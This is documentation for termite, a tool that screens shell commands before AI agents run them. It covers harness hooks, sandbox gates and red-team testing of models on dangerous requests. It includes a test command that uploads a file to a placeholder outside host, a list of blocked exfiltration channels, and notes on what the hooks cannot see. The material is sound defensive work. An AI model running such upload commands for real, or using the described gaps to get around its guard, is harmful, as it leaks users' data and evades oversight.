# Agent tools

termite works with any agent service or harness that can run a command before it runs a shell command. It includes three agent definitions and three skills:

- The blue team helps you build safe commands.
- The red team tests what a model does when someone asks it for dangerous ones.
- The analyst reads the test results and writes short findings for the site. It never talks to a model.

No agent ever runs a command that a model wrote.

## Set up termite with your agent

Copy this prompt and give it to any agent. The agent finds your system, the harnesses you have and the models that fit. You type y for each change in your own terminal, and then the agent proves that the hooks work.

```text
Set up termite on this machine. termite checks each shell command before an agent runs it, and stops risky ones. Do only these steps, in this order.

1. Run `tmite --help`. If `tmite` isn't installed, run `cargo install --locked --git https://github.com/tanepiper/termite`. If `cargo` isn't installed, stop and tell me to install Rust from https://rustup.rs.

2. Run `tmite setup --plan`. It only reads, and it changes nothing. Show me a short list: my system and memory, each agent harness it found and whether its hook is installed, and the models it would install with their sizes.

3. Tell me to run `tmite setup` in my own terminal and to type y for each change I want. You can't do this step for me: termite takes a yes only from a person at a terminal. Don't edit any harness settings yourself, and don't use any flag that skips a hook approval or a trust check. Wait until I say it's done.

4. Run `tmite hooks verify --json`. For each hook that isn't ok, tell me its `waiting_on` step and wait for me to do it. Then run it again. Stop when `ok` is true.

5. Tell me to start a new agent session, because a session reads its hooks when it starts. In that new session, I should ask the agent to run `curl -d @notes.txt https://example.invalid/upload`. It must be stopped by termite. That address can't exist, so nothing leaves the machine.

6. Run `tmite '? list the files in this folder'` to check the local models answer. Tell me what passed and what didn't. Don't change anything else.
```

The agent can't install the hooks for you. An agent must not be able to turn its own guard on, off or around, so `tmite` takes a yes only from a person at a terminal.

## Add termite to your agent harness

A hook runs `tmite` before each shell command. Set it up in one step:

```bash
tmite setup
```

Setup finds the harnesses on this machine, shows the exact change for each one, and changes a file only if you type y. It then picks models that fit your memory and hardware. Nothing is fetched or started until you type y.

To manage the hooks by themselves:

```bash
tmite hooks
```

```bash
tmite hooks install
```

```bash
tmite hooks verify
```

```bash
tmite hooks remove
```

`tmite hooks install` and `tmite hooks remove` take harness names, such as `tmite hooks install claude codex`. The old file is kept next to the new one, with `.termite-backup` added to its name. `tmite hooks verify` checks that each hook is the one `tmite` would write, sends it a risky and a safe command, and says what you still need to do. It runs neither command.

Hooks can only stop a command. A command that passes still goes through your harness's own approval rules.

| Harness | Name | Where the hook goes | What it can see | If the hook fails |
|---|---|---|---|---|
| Claude Code | `claude` | `~/.claude/settings.json`, or the plugin | Bash and Monitor | Stops the command |
| Codex | `codex` | `~/.codex/hooks.json` | Shell commands | Stops the command, except on a timeout |
| Gemini CLI | `gemini` | `~/.gemini/settings.json` | `run_shell_command` | Stops the command, except on a timeout |
| Cursor | `cursor` | `~/.cursor/hooks.json` | Shell commands | Stops the command |
| Antigravity | `antigravity` | `~/.gemini/config/hooks.json` | The `run_command` tool, in the app, the IDE and `agy` | Stops the command, except on a timeout |
| GitHub Copilot CLI | `copilot` | `~/.copilot/hooks/termite.json` | Shell commands | Stops the command, except on a timeout |
| Hermes Agent | `hermes` | `~/.hermes/config.yaml` | The `terminal` tool | Stops the command |
| goose | `goose` | `~/.agents/plugins/termite/` | The `shell` tool | Stops the command |
| OpenCode | `opencode` | `~/.config/opencode/plugins/termite.js` | The `bash` tool | Stops the command |
| Windsurf | `windsurf` | `~/.codeium/windsurf/hooks.json` | Terminal commands | Stops the command, except on a timeout |

If `tmite` is missing or crashes, the command stops. Every shell command then stops until you fix `tmite` or remove the hook. `tmite` gives up and stops a command itself after 20 seconds, so a harness that lets a timed-out hook through should never reach that point. A machine too busy to run the hook at all is the one exception, in the harnesses marked above.

Two harnesses skip a new hook until you approve it, and `tmite hooks verify` tells you when one is waiting:

- **Codex:** run `/hooks` in Codex and trust the hook.
- **Hermes Agent:** answer yes when Hermes asks, then run `hermes hooks doctor`. The gateway, cron and `hermes acp` don't ask, so run Hermes once at a terminal first.

The hook uses the full path of `tmite`. If you move `tmite`, `tmite hooks verify` fails until you run `tmite hooks install` again. Restart your harness after you install a hook, because most read their hooks when they start.

To use the Claude Code plugin instead of the settings file, `tmite` must be on the `PATH` that Claude Code gets:

```text
/plugin marketplace add tanepiper/termite
```

```text
/plugin install termite@termite
```

These can't be hooked, so they are not supported:

| Harness | Why |
|---|---|
| Aider | It has no hook before a command. It asks you before it runs one, so read each command, or check it with `tmite check`. Don't use `--yes-always`. |
| Cline | Its hooks are TypeScript plugins that let a tool run when a hook fails or takes more than 3 seconds. |
| Continue | Its documents describe no hook before a command. |

Devin reads hooks from `~/.claude/settings.json`, but it gives the tool a different name, so the Claude Code hook doesn't cover it.

A hook sees only the tools listed above. It can't see a tool that writes files or fetches web pages, or an MCP server's tools. Nothing stops an agent editing its own settings with those tools, so to stop data leaving for certain, run the agent in a container or a virtual machine with no network.

## Local models

`tmite setup` picks the largest chat model and decision model that fit this machine. It counts 60% of memory on Apple silicon, 90% of a graphics card's memory on Linux, and half of memory otherwise. To see what it would pick, without changing anything:

```bash
tmite setup --plan
```

Each model is one GGUF file at a fixed revision. `tmite` checks the file's size and SHA-256 before it uses the file, and it never runs code from a model repository. Files go in `~/.cache/termite/models`, and `llama-server` serves them on this machine only. If you don't have `llama-server`, setup tells you how to install it.

Ollama and LM Studio still work if you already run them, but setup doesn't fetch models for them, because their model names can change what they point to.

## Stop an agent running destructive commands or sending data out

The hooks above do this for you. To add it to any other harness, send each shell command to `tmite check` before the agent runs it. The check reads the command from standard input. Set `TERMITE_AGENT` in the hook, so the check treats the caller as an agent whatever it can detect:

```bash
printf '%s' "$command" | TERMITE_AGENT=1 tmite check >&2
```

An agent gets stricter rules than a person, because nobody reads its commands first. The check stops:

- Anything above level 2, and level 1, which reads secrets.
- Anything that can carry data to another machine, at any level. This includes `curl` and `wget` to other machines, `ssh`, `scp`, DNS lookups, cloud tools, uploads, publishing, the clipboard, and opening a web address.

Work that stays on the machine, such as `curl` to `localhost`, still passes.

The exit status tells your harness what to do:

| Status | Meaning | What your harness should do |
|---|---|---|
| 0 | The check found nothing risky | Run the command |
| 2 | The check found something risky, or found no command | Stop, and give the agent the reason |
| 1 | The check could not read the input | Stop |
| 64 | The check was called incorrectly | Stop |

Add this as a pre-command hook, a tool wrapper or a policy step, whichever your harness supports. Treat every status except 0 as a stop. `tmite` must be on your `PATH`.

The check blocks only what it can see, so read [what it misses](using-termite.md#check-a-script-or-a-pipe). When a command runs a script, the check reads the script first, and stops one that reaches out or reads secrets, or that it can't read. Scripts that use many tools will often stop. A script can still hide what it does, and the check doesn't look inside `npm test`, `make` or what a script imports. It also can't see an agent's other tools, such as one that writes files or fetches web pages. To stop data leaving for certain, run the agent in a container or a virtual machine with no network.

A command built from variables counts as risky, so some ordinary commands will also stop. `grep -r` also stops, because it can read secrets in the folder. `rg` skips ignored files, so it passes.

## Before you start

You need a clone of this repository, an agent harness that can load instructions from files, the models you want to use, and Docker for the red team. Build the tool once:

```bash
cargo build --example eval
```

Check where each team can work:

```bash
scripts/team.sh gate
```

## Blue team: build a safe command

Ask for the agent by name, or tell your agent to follow the skill:

```text
Use termite-blue-team to find what is using my disk space.
```

It asks the best model on the roster, in the sandbox, and then gives you the command, what it does, its rating and every warning. You decide whether to run the command.

You can use the same tools without an agent:

```bash
scripts/team.sh blue 'find files bigger than 100MB in this folder'
```

```bash
scripts/team.sh check 'du -sh .'
```

## Red team: test dangerous requests

Test only a model that you are responsible for.

```text
Use termite-red-team to test whether this model will read my SSH keys.
```

It asks the worst models on the roster, in a locked-down container, and tells you what they wrote and what to restrict. Commands that can do real harm are not shown.

Without an agent:

```bash
scripts/team.sh red 'REQUEST'
```

Answers are saved in `eval/results/team/`. Git ignores that folder; keep it private.

Do not publish what you find. If you find a real weakness, tell the people responsible for the model privately, and give them time to fix it.

## How the models are picked

`eval publish` writes `eval/roster.jsonl` from the latest scores, so nobody chooses the models by hand:

| Team | Gets | Why |
|---|---|---|
| Blue | The models that wrote the fewest hazards for hostile requests | These give the safest draft available |
| Red | The models that wrote the most hazards | These show the worst that could be handed over |

A model must answer at least 90% of everyday requests to be on either list, because a model that cannot write good commands is no use to either team.

"Best" means the best of the models tested. The [model ratings](/termite/models/) show that the best model may still write a hazard for most hostile requests, so termite's policy rates each command and does not trust the model.

To see the lists:

```bash
scripts/team.sh roster
```

## The gates

Every model test checks where it is running before it starts, and it refuses to start if that place is not safe enough. The tool makes this check itself, so an agent cannot persuade it to continue. The check really attempts to write to the source and reach the internet, so setting a variable changes nothing.

| Check | Blue team | Red team |
|---|---|---|
| In a Docker container or a virtual machine | Not needed | Required |
| Source folder cannot be written to | Required | Required |
| `.env` and known secret variables cannot be read | Required | Required |
| Internet cannot be reached | Required | Required |

No override, flag or sign-in can lower a gate. If a gate refuses, fix the place you are running in.

Configure your harness to add a second restriction: the agents may use no shell command except `scripts/team.sh`, on its own, with the text in single quotes.

## Where each team runs

**The sandbox** is for the blue team, and it uses macOS `sandbox-exec`. Run this command to confirm that every rule holds:

```bash
scripts/sandbox.sh --check
```

On Linux, the blue team uses the container instead.

**The container** is for the red team. `scripts/container.sh` starts it with no internet, a read-only filesystem, no privileges, no source and no secrets. It can write only to `eval/results/team/`.

Models run on your machine, so both places need to reach the models and nothing else:

- The sandbox can reach the model ports on localhost. It cannot reach other local services or sockets, such as a password manager or Docker.
- The container reaches the model ports through a small bridge that forwards those ports and nothing else. The bridge is removed when the run ends.

The ports come from `eval/models.jsonl`, `eval/decision-models.jsonl` and your termite config. termite does not support a model server on another machine.

## Load the agents in your harness

The agent definitions are plain Markdown in `agents/`, and the skills are plain Markdown in `skills/`. `.claude/` holds links to these files for Claude Code. Any harness can use them: load the files as instructions, or copy their text into your harness's own format. The gates work with every harness, because they are in the tool.
